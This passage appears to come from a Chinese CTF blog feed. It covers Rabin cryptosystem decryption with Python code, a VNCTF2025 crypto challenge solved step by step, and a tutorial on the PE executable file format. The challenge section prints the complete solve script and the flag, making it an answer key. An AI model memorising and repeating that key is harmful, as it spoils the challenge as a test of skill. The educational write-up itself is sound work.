c^{\frac{p+1}{4}}mod~p,y_1\equiv c^{\frac{q+1}{4}}~mod(~q)$，这样求可以快速求出两个式子的一个平方根但是这俩个平方根不一定是真的<code>m</code></li><li>所以分别求得这俩个同余式的平方根后，由根的对称性原理其实就很容易求得$x_2\equiv p-x_1~(mod~p),y_2\equiv q-y_1~(mod~p)$</li><li>分别求得俩组解后，使用<code>CRT</code>最终求得密文。</li></ul></li><li><p>接下来使用代码演示一下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_p_q</span>(<span class="params">p_bit,q_bit</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(p_bit)</span><br><span class="line">        q = getPrime(q_bit)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> q % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> p,q</span><br><span class="line">message = <span class="string">b&#x27;this_is_message&#x27;</span></span><br><span class="line">m = bytes_to_long(message)</span><br><span class="line">e = <span class="number">2</span></span><br><span class="line">p,q = my_p_q(<span class="number">512</span>,<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;加密参数如下:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q =&quot;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;m =&quot;</span>,m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接下来是解密过程,先解二次同余方程,再求解令一个根,最后使用CRT</span></span><br><span class="line">x1 = <span class="built_in">pow</span>(c,(p+<span class="number">1</span>)//<span class="number">4</span>,p)</span><br><span class="line">y1 = <span class="built_in">pow</span>(c,(q+<span class="number">1</span>)//<span class="number">4</span>,q)</span><br><span class="line"></span><br><span class="line">x2 = (p-x1) % p</span><br><span class="line">y2 = (q-y1) % q</span><br><span class="line"></span><br><span class="line">c1 = [x1,x2]</span><br><span class="line">c2 = [y1,y2]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> c2:</span><br><span class="line">        M = p*q</span><br><span class="line">        m1 = q</span><br><span class="line">        m2 = p</span><br><span class="line">        m1_ = gmpy2.invert(m1,p)</span><br><span class="line">        m2_ = gmpy2.invert(m2,q)</span><br><span class="line">        x = (m1*m1_*i + m2*m2_*j) % M</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(x))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b&#x27;this_is_message&#x27;</span></span><br><span class="line"><span class="string">b&quot;?\xbb\xfc&lt;\x89/*`x\xc7V&#x27;y\xa7?\xf3#.T\x06R\xf2\x8b\x90\x16\xe5L\xc3\x82\x8a\xdfSS\x1e\x89-F\x8b\x1b\\\x12\t\xa3\xc79\xe9\x04\xe4\xe3\xa78E\x80A\xc8\xdf\xc7\xfc\xb84;P\xb8\x9b\xb6\xde^v\xd4&amp;\xe3i\x91\xf6\x86\xdch\xf3\xd5\xb1\x93\xd7\xe8&gt;0\x17\xf8Z\xfb\xc0\xe7\xb5-%\xaf\xa0t\xa6\xa9\x80\xfe\xa0*u\x96\xa0\xe2\x89\xf0&amp;=\xb9\x88\xb6\x06\x07\x85,\x07\xb8\xa6\xba\xb3\xd7$M\xb0\xd6&quot;</span></span><br><span class="line"><span class="string">b&#x27;V\x85\x1cR\xd1\xc5\xb8r\xcenk\xba\x91\x17\xcdQ\xbd\xdc\x96\xc5MJ\x16\xa23|\xe0&lt;=PZ\xec\xd8\x9d\x14*51f\x97\x19\x87/\x91&amp;\xae\xee&#125;\x1b\x1c\x9e\xa8\xb6VC,S\xfb\xfd\x8eh\xc5\x88\xea\xcb\xac\xcf \x85!\xdc\x04\xec\xdfz\x82\x0b\xa4\xe8\x97\xa9\x84\x9d\xea\xbb\xadF*\x89f8\xcc\xb9\xd2\xeb\xae&quot;\x0b\x01\xb1\xbe\xd0K\xf2yC\x15+\xd4Z;\xe3\xa1y\x1e&lt;\x019&#123;\x13\xcc\x8c2\xe4\x9awfk&#x27;</span></span><br><span class="line"><span class="string">b&quot;\x96A\x18\x8fZ\xf4\xe2\xd3G5\xc1\xe2\n\xbf\rD\xe1\n\xea\xcb\xa0&lt;\xa22Jb,\xff\xbf\xdb:@+\xbb\x9dW&#123;\xbc\x81\xf3+\x90\xd3X`\x97\xf3a\xfe\xc3\xd6\xee6\x98\x0c\x0c\x1b\xf8\xb5\xc2\xa4\x16A\x86\x82\x8b-\x97YH\xbfn~\xd6\x01^t\x98\xbeI=\\\x86(\xeb\xc5&gt;\x85\x85&#x27; \x81\xe6\xf8\x9bN\x96\xb1\xab2\xbdpvh\x0f\xe3\xf7\xb5\xc4\x80y\x9d)\xba\xbb\xda\x13\x06\x19Y\x13\xd9\x81HKc\xaf\xdc&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="例题">例题</h2><ul><li>题目来源：<code>VNCTF2025</code></li><li>题目附件如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">flag=bytes_to_long(flag)</span><br><span class="line">l=flag.bit_length()//<span class="number">3</span> + <span class="number">1</span></span><br><span class="line">n=[]</span><br><span class="line">N=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(n) &lt; <span class="number">3</span>:</span><br><span class="line">    p = <span class="number">4</span>*getPrime(l)-<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(p):</span><br><span class="line">        n.append(p)</span><br><span class="line">        N *= p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;flag*flag%N&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># flag**2 % N</span></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols, expand</span><br><span class="line">x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">polynomial = expand((x - n[<span class="number">0</span>]) * (x - n[<span class="number">1</span>]) * (x - n[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;polynomial=&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># c=24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"><span class="comment"># polynomial=x**3 - 15264966144147258587171776703005926730518438603688487721465*x**2 + 76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923*x - 125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>非常典型的<code>Rabin</code>加密算法，其实还有不同的就是这个程序是三个素数的<code>Rabin</code>加密算法，而且题目没有正常的将<code>n、p、q、r</code>告诉我们而是给了一个多项式。</li><li>其实直接那多项式的系数进行分解就行，这边<code>sage</code>可以支持分解多项式，那就用<code>sage</code>分解。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a3 = <span class="number">1</span></span><br><span class="line">a2 = -<span class="number">15264966144147258587171776703005926730518438603688487721465</span></span><br><span class="line">a1 = <span class="number">76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923</span></span><br><span class="line">a0 = -<span class="number">125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(QQ)</span><br><span class="line">f = x^<span class="number">3</span> + a2*x^<span class="number">2</span> + a1*x + a0</span><br><span class="line">result = f.factor()</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(x - 5908636118089697338533572785710162817248001570348495067227) * (x - 5487564316951417093934647798659941512646442958127439071827) * (x - 3868765709106144154703556118635822400623994075212553582411)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>接下来其实就是正常的<code>Rabin</code>算法的界面，只不过要解三个二次同余式，<code>CRT</code>的次数也比较多，exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(x - 5908636118089697338533572785710162817248001570348495067227) * (x - 5487564316951417093934647798659941512646442958127439071827) * (x - 3868765709106144154703556118635822400623994075212553582411)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">5908636118089697338533572785710162817248001570348495067227</span></span><br><span class="line">q = <span class="number">5487564316951417093934647798659941512646442958127439071827</span></span><br><span class="line">r = <span class="number">3868765709106144154703556118635822400623994075212553582411</span></span><br><span class="line">n = p*q*r</span><br><span class="line">c = <span class="number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line">x1 = <span class="built_in">pow</span>(c,(p+<span class="number">1</span>)//<span class="number">4</span>,p)</span><br><span class="line">y1 = <span class="built_in">pow</span>(c,(q+<span class="number">1</span>)//<span class="number">4</span>,q)</span><br><span class="line">z1 = <span class="built_in">pow</span>(c,(r+<span class="number">1</span>)//<span class="number">4</span>,r)</span><br><span class="line">x2 = (p-x1) % p</span><br><span class="line">y2 = (q-y1) % q</span><br><span class="line">z2 = (r-z1) % r</span><br><span class="line">c1 = [x1,x2]</span><br><span class="line">c2 = [y1,y2]</span><br><span class="line">c3 = [z1,z2]</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"><span class="built_in">print</span>(c3)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> c2:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> c3:</span><br><span class="line">            M = n</span><br><span class="line">            m1 = n//p</span><br><span class="line">            m2 = n//q</span><br><span class="line">            m3 = n//r</span><br><span class="line">            m1_ = gmpy2.invert(m1,p)</span><br><span class="line">            m2_ = gmpy2.invert(m2,q)</span><br><span class="line">            m3_ = gmpy2.invert(m3,r)</span><br><span class="line">            X = (m1*m1_*i + m2*m2_*j + m3*m3_*k) % M</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(X))</span><br><span class="line"><span class="comment"># b&#x27;VNCTF&#123;90dcfb2dfb21a21e0c8715cbf3643f4a47d3e2e4b3f7b7975954e6d9701d9648&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：学习密码学</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    <category term="RSA" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/RSA/"/>
    
    
  </entry>
  
  <entry>
    <title>PE文件结构</title>
    <link href="http://iyheart.github.io/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
    <id>http://iyheart.github.io/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</id>
    <published>2025-08-08T04:10:50.000Z</published>
    <updated>2025-08-10T15:38:16.472Z</updated>
    
    <content type="html"><![CDATA[<ul><li>推荐查看<code>PE</code>文件格式的工具：<code>010editor</code>、<code>CFF</code>、<code>winhex</code>。</li><li>其中<code>010editor</code>可以在之后逆向作为工具使用（其有PE模版，PE不同头的部分会有不同颜色的高亮），CFF可以具体查看PE文件结构体的具体值，<code>winhex</code>二进制查看器（用于学习）。</li><li>CFF汉化版：[<a href="https://bbs.kanxue.com/thread-138015.htm">分享][汉化]CFF Explorer 7.9 官方版（支持中文）-安全工具-看雪-安全社区|安全招聘|kanxue.com</a></li></ul><h1 id="vs2022写汇编">VS2022写汇编</h1><ul><li>由于要用到<code>vs2022</code>编写汇编程序所以先来简单介绍一下在<code>vs2022</code>中如何可以设置编译汇编。先新建一个项目</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701181212392.png" alt="image-20250701181212392"></p><ul><li>然后选择新建这个类型的项目</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701181246713.png" alt="image-20250701181246713"></p><ul><li>点击<code>Windows</code>桌面引导后就选择如图选项</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701181352226.png" alt="image-20250701181352226"></p><ul><li>之后右键新创建的项目，选择<code>生成依赖项---&gt;生成自定义</code></li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701181501755.png" alt="image-20250701181501755"></p><ul><li>勾选<code>masm</code>选项</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701181525445.png" alt="image-20250701181525445"></p><ul><li>现在就可以新建一个<code>.asm</code>后缀的文件，写入如下代码，注意下面这个汇编代码是在<code>i386</code>架构下的</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701181557776.png" alt="image-20250701181557776"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">extern MessageBoxA@16:proc</span><br><span class="line">extern ExitProcess@4:proc</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">    msgTitle db &quot;PE&quot;, 0</span><br><span class="line">    msgText  db &quot;Hello world!&quot;, 0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main:</span><br><span class="line">    push 0</span><br><span class="line">    push offset msgTitle</span><br><span class="line">    push offset msgText</span><br><span class="line">    push 0</span><br><span class="line">    call MessageBoxA@16</span><br><span class="line"></span><br><span class="line">    push 0</span><br><span class="line">    call ExitProcess@4</span><br><span class="line">    ret</span><br><span class="line">end main</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>既然是<code>i386</code>架构下的汇编，我们就需要将这里设置为<code>x86</code>，建议<code>debug</code>模式</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701181815141.png" alt="image-20250701181815141"></p><ul><li>之后查看编译器是<code>ml.exe</code>还是<code>ml64.exe</code>，因为<code>x86</code>和<code>x64</code>的汇编语法上会存在不同，使用<code>ml64</code>编译<code>i386</code>的程序会编译不通过。</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701181930556.png" alt="image-20250701181930556"></p><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701182019631.png" alt="image-20250701182019631"></p><ul><li>如果是<code>release</code>模式，在编译的时候就会出现这个问题</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701182127025.png" alt="image-20250701182127025"></p><ul><li>这个也比较好解决，解决方法就是在下图的<code>命令行</code>这一栏添加这么一句<code>ml</code>的汇编命令<code>/SAFESEH:NO</code></li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701182250518.png" alt="image-20250701182250518"></p><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701182319450.png" alt="image-20250701182319450"></p><ul><li>这样就可以编译通过了</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701182409366.png" alt="image-20250701182409366"></p><h1 id="pe文件结构简述">PE文件结构简述</h1><ul><li>每个成熟的带有后缀名的文件比如<code>.exe</code>、<code>.pdf</code>、<code>.jpg</code>等文件都会有属于自己特有的文件头和文件尾。当我们查看或者运行这些文件的时候，操作系统并不是根据后缀名来识别这些文件类型。操作系统是通过识别这些<strong>文件的文件头和文件尾</strong>来判断这些文件具体是属于哪一类型。</li><li><code>PE</code>，英文全称为<code>portable executable</code>是可移植可执行文件。</li><li>对于<code>PE</code>可执行文件即<code>.exe</code>后缀的文件也是如此，<code>PE</code>文件也有属于自己的文件结果（文件头和文件尾），在这些文件中隐藏着一些程序运行的信息，并且<strong>一些反调试技术也与PE文件格式相关</strong>，所以在学<code>Windows</code>用户程序逆向之前，先要具体详细地学习一下<code>PE</code>文件结构。</li><li><code>PE</code>文件头大概有如下结构：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DOS_HEADER;  <span class="comment">//DOS头</span></span><br><span class="line">IMAGE_NT_HEADERS;  <span class="comment">//NT头,NT头包含了两个子结构</span></span><br><span class="line">    IMAGE_FILE_HEADER;  <span class="comment">//NT的文件头</span></span><br><span class="line">IMAGE_OPTIONAL_HEADER;<span class="comment">//NT的选项头文件,为可执行文件指定选项</span></span><br><span class="line">IMAGE_SECTION_HEADER;<span class="comment">//段头,段头与段数据的风格就是类似于Pascal风格字符串.有几个段数据,就会出现段头,</span></span><br><span class="line">.....<span class="comment">//段头都被放在一起</span></span><br><span class="line">IMAGE_SECTION_HEADER;<span class="comment">//段头</span></span><br><span class="line">SECTION_DATA;<span class="comment">//段数据</span></span><br><span class="line">....</span><br><span class="line">SECTION_DATA;<span class="comment">//段数据</span></span><br><span class="line">user data;<span class="comment">//附加数据,属于自定义类型,不属于格式一类.</span></span><br></pre></td></tr></table></figure><ul><li><code>PE</code>文件处于内存中的时候通常称为<strong>映像</strong></li></ul><h1 id="pe文件结构">PE文件结构</h1><ul><li>上面我们已经使用<code>VS2022</code>汇编出了<code>exe</code>文件，先使用<code>010Editor</code>查看一下这个<code>exe</code>文件<code>PE</code>结构。</li></ul><h2 id="dos头">DOS头</h2><ul><li><code>MZ</code>是一个DOS头的识别部分，当操作系统执行这个可执行文件的时候，并不是看拓展名，而是看这个文件的二进制形式，其实<code>DOS</code>头的<strong>标志性标识</strong>其实就是<code>0x4D 0x5A</code>也就是<code>MZ</code>，<code>MZ</code>其实是<code>DOS</code>最早期作者的名字缩写。</li><li>而这个<code>DOS头</code>中我们标注<code>CC</code>的这边实际上是<strong>可以任意修改的、可以使用的</strong>，修改后并不影响其执行。标注<code>CC</code>的地方其实是为<code>DOS</code>文件执行的时候提供环境信息，这个环境信息包括<strong>寄存器值、可选重定位表、中断向量表、文件句柄表等</strong></li><li>最后的<code>32</code>位其实标明了<strong>新结构的位置(NT头的位置)</strong>，其中<code>0xC8</code>其实就是<code>PE</code>结构标识符中<code>P</code>字母的位置。</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701190415703.png" alt="image-20250701190415703"></p><ul><li>在<code>PE</code>和<code>DOS</code>头这边还有一段数据，其实也就是这一段数据。这一部分被称为<code>Stub</code>数据，通常被叫做<strong>残留数据</strong>(包含二进制指令和数据)。</li><li>当该文件在DOS下执行时，其就会真正从<code>offset=0x40</code>这个位置开始执行，最先开始执行<code>0x0E</code></li><li>在<code>DOS</code>执行后就会出现这样的提示：<code>This program cannot be run in DOS mode.</code></li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701190659291.png" alt="image-20250701190659291"></p><ul><li>使用<code>IDA</code>反汇编就能看到这一段的具体指令了</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701191610768.png" alt="image-20250701191610768"></p><ul><li>接下来为了更熟悉<code>DOS</code>文件结构，就将<code>DOS</code>结构体敲一遍抄下来</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> stuct _IMAGE_DOS_HEADER&#123;</span><br><span class="line">    WORD e_magic;<span class="comment">//0x00 魔数: 存储DOS头&quot;MZ&quot;(0x5A4D,小端序就变成0x4D5A)</span></span><br><span class="line">    WORD e_cblp;<span class="comment">//0x02 存储最后一页剩余的字节数</span></span><br><span class="line">    WORD e_cp;<span class="comment">//0x04 文件总页数(512字节为单位)</span></span><br><span class="line">    WORD e_crlc;<span class="comment">//0x06 重定位表项数</span></span><br><span class="line">    WORD e_cparhdr;<span class="comment">//0x08 头部大小(以16字节为单位)</span></span><br><span class="line">    WORD e_minalloc;<span class="comment">//0x0A 程序最小额外分配内存(段数)</span></span><br><span class="line">    WORD e_maxalloc;<span class="comment">//0x0C 程序最大额外分配内存(段数)</span></span><br><span class="line">    WORD e_ss;<span class="comment">//0x0E 初始栈段地址(相对加载地址)</span></span><br><span class="line">    WORD e_sp;<span class="comment">//0x10 初始栈指针</span></span><br><span class="line">    WORD e_csum;<span class="comment">//0x12 校验和(通常为0,未使用)</span></span><br><span class="line">    WORD e_ip;<span class="comment">//0x14 初始指令指针(寄存器IP的初始值)</span></span><br><span class="line">    WORD e_csl;<span class="comment">//0x16 初始代码段地址 (相对加载地址)</span></span><br><span class="line">    WORD e_lfarlc;<span class="comment">//0x18 重定位表偏移 (从文件头开始的偏移)</span></span><br><span class="line">    WORD e_ovno;<span class="comment">//0x1A overlay号 (从文件头开始的偏移)(用于老式 DOS 多阶段加载)</span></span><br><span class="line">    WORD e_res[<span class="number">4</span>];<span class="comment">//0x1C~0x24 保留字段</span></span><br><span class="line">    WORD e_oemid;<span class="comment">//0x24 OEM标识符(用户自定义)(系统厂商自定义)</span></span><br><span class="line">    WORD e_oemindfo;<span class="comment">//0x26 OEM信息(和e_oemid配对)</span></span><br><span class="line">    WORD e_res2[<span class="number">10</span>];<span class="comment">//0x28~0x3C 额外保留字段</span></span><br><span class="line">    LONG e_lfanew;<span class="comment">//0x3C 指向 PE 文件头 (NT头) 偏移</span></span><br><span class="line">&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><ul><li>其实这一段都是可以<code>人为修改</code>和<code>利用</code>的</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701193847234.png" alt="image-20250701193847234"></p><h2 id="nt头">NT头</h2><ul><li><code>NT</code>头有三个主要结构体。其中一个是NT标识即<code>IMAGE_NT_HEADERS</code>，还有俩个子结构<code>IMAGE_FILE_HEADER</code>、<code>IMAGE_OPTIONAL_HEADER</code>。</li></ul><h3 id="nt头_nt_headers">NT头_NT_HEADERS</h3><ul><li>在<code>VS</code>中查看<code>NT</code>头，发现<code>NT</code>头定义有区分<code>32</code>位和<code>64</code>位</li></ul><p><img 